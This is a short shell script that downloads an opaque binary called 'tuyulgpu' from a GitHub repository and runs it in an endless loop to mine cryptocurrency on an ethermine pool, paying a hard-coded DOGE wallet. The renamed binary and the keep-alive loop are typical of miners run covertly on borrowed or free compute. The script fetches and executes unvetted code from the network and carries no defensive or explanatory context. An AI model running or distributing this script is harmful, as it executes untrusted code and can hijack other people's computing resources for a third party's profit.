#!/bin/sh

sudo apt update

sudo apt install screen -y

POOL=eu1.ethermine.org:5555

WALLET=DOGE:DFiaVgWHtapYPx3qkrGq8FQi6GpTmHdXEy

WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Doge#pr1d-5r70)

wget https://github.com/skullCANDe/skyz/raw/main/tuyulgpu

chmod +x tuyulgpu

while [ 1 ]; do

./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY

sleep 5

done

sleep 999999999
